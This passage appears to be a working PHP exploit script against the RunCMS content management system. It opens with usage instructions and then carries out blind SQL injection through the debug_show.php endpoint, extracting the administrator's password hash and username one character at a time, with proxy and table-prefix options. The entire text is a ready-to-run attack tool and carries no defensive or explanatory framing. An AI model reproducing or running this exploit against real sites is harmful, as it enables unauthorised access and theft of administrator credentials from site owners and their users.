*/

if ($argc<3) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to runcms

Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]:    ""   a proxy
 -T[prefix]      ""   a table prefix (default: runcms)
Example:
php '.$argv[0].' localhost /runcms/ ls -la -P1.1.1.1:80
php '.$argv[0].' localhost /runcms/ ls -la -p81
---------------------------------------------------------------------------
');
    die;
}

error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$prefix="runcms";

for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
//print_r(array_values($md5s));
echo "md5 hash -> ";
$j=1;$password="";
while (!strstr($password,chr(0))){
    for ($i=0; $i<=255; $i++){
        if (in_array($i,$md5s)){
            $executed_queries=array();
            //original query: EXPLAIN ...
            $executed_queries[0]="SELECT null FROM ".$prefix."_users WHERE 1=(IF((ASCII(SUBSTRING(pass,".$j.",1))=".$i."),1,999999)) AND rank=7 LIMIT 
1";
            $sql=urlencode(serialize($executed_queries));
            $sql=str_replace("%22","%2522",$sql);//you know, urldecode()...
            $data ="debug_show=show_queries";
            $data.="&executed_queries=".$sql;
            $data.="&sorted=1";
            $packet ="POST ".$p."class/debug/debug_show.php HTTP/1.0\r\n";
            $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
            $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Content-Length: ".strlen($data)."\r\n";
            $packet.="Pragma: no-cache\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            send($packet);
            if (eregi("_users&nbsp;</td>",$html)){$password.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {die("Exploit failed...");}
  }
  $j++;
}
echo "\n";

echo "admin username -> ";
$j=1;$admin_user="";
while (!strstr($admin_user,chr(0))){
    for ($i=0; $i<=255; $i++){
        $executed_queries=array();
        $executed_queries[0]="SELECT null FROM ".$prefix."_users WHERE 1=(IF((ASCII(SUBSTRING(uname,".$j.",1))=".$i."),1,999999)) AND rank=7 LIMIT 1";
        $sql=urlencode(serialize($executed_queries));
        $sql=str_replace("%22","%2522",$sql);
        $data ="debug_show=show_queries";
        $data.="&executed_queries=".$sql;
        $data.="&sorted=1";
        $packet ="POST ".$p."class/debug/debug_show.php HTTP/1.0\r\n";
        $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
        $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
        $packet.="Host: ".$host."\r\n";
        $packet.="Content-Length: ".strlen($data)."\r\n";
        $packet.="Pragma: no-cache\r\n";
        $packet.="Connection: Close\r\n\r\n";
        $packet.=$data;
        send($packet);
        if (eregi("_users&nbsp;</td>",$html)){$admin_user.=chr($i);echo chr($i); sleep(1); break;}
    }
    if ($i==255) {die("Exploit failed...");}
    $j++;
}
?>